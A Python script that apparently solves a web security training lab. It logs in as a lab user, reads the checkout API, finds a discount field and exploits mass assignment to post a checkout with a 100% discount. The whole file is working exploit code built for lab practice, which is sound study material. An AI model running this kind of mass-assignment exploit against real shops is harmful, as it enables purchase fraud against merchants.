#!/usr/bin/env python3
import requests
import sys
import urllib3
from lxml import html
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf_token(session, url):
    page = session.get(url)
    tree = html.fromstring(page.content)
    csrf_input = tree.xpath('//input[@name="csrf"]/@value')
    return csrf_input[0] if csrf_input else ""


def login(session, lab_url, username, password):
    csrf_token = get_csrf_token(session, f"{lab_url}/login")
    credentials = {'csrf': csrf_token, 'username': username, 'password': password}
    response = session.post(f"{lab_url}/login", data=credentials)
    return response.status_code == 200


def add_product_to_cart(session, lab_url, product_id, quantity=1):
    payload = {'productId': str(product_id), 'redir': 'PRODUCT', 'quantity': str(quantity)}
    return session.post(f"{lab_url}/cart", data=payload)


def discover_api_structure(session, lab_url):
    response = session.get(f"{lab_url}/api/checkout")
    if response.status_code != 200:
        return None
    
    try:
        data = json.loads(response.text)
        return data
    except:
        return None


def find_discount_field(api_data):
    if not api_data:
        return None
    
    for key in api_data.keys():
        if 'discount' in key.lower():
            return key
    return None


def checkout_with_discount(session, lab_url, product_id, discount_field, discount_percentage, quantity=1):
    payload = {
        discount_field: {"percentage": discount_percentage},
        "chosen_products": [{"product_id": str(product_id), "quantity": quantity}]
    }
    return session.post(f"{lab_url}/api/checkout", json=payload)


def check_lab_solved(session, lab_url):
    home = session.get(lab_url)
    if "Congratulations, you solved the lab!" in home.text:
        return True
    tree = html.fromstring(home.content)
    banner = tree.xpath('//div[@class="notification-success"]//text()')
    return any('solved' in text.lower() for text in banner)


def solve_lab(lab_url):
    lab_url = lab_url.rstrip('/')
    session = requests.Session()
    session.verify = False
    
    print(f"[*] Target: {lab_url}\n")
    
    print("[1] Logging in as wiener:peter")
    if not login(session, lab_url, 'wiener', 'peter'):
        print("[-] Login failed")
        return False
    
    print("[2] Adding product to cart")
    add_product_to_cart(session, lab_url, product_id=1)
    
    print("[3] Discovering API structure (GET /api/checkout)")
    api_data = discover_api_structure(session, lab_url)
    if api_data:
        print(f"    API Response: {json.dumps(api_data, indent=2)}")
    else:
        print("[-] Could not retrieve API structure")
        return False
    
    print("[4] Searching for discount-related fields")
    discount_field = find_discount_field(api_data)
    if discount_field:
        print(f"    [+] Found discount field: '{discount_field}'")
    else:
        print("[-] No discount field found")
        return False
    
    print("[5] Exploiting mass assignment (100% discount)")
    response = checkout_with_discount(session, lab_url, product_id=1, 
                                     discount_field=discount_field, 
                                     discount_percentage=100)
    print(f"    Checkout status: {response.status_code}")
    
    print("[6] Checking lab status")
    if check_lab_solved(session, lab_url):
        print("[+] LAB SOLVED!\n")
        return True
    else:
        print("[-] Lab NOT solved\n")
        return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <LAB_URL>")
        sys.exit(1)
    solve_lab(sys.argv[1])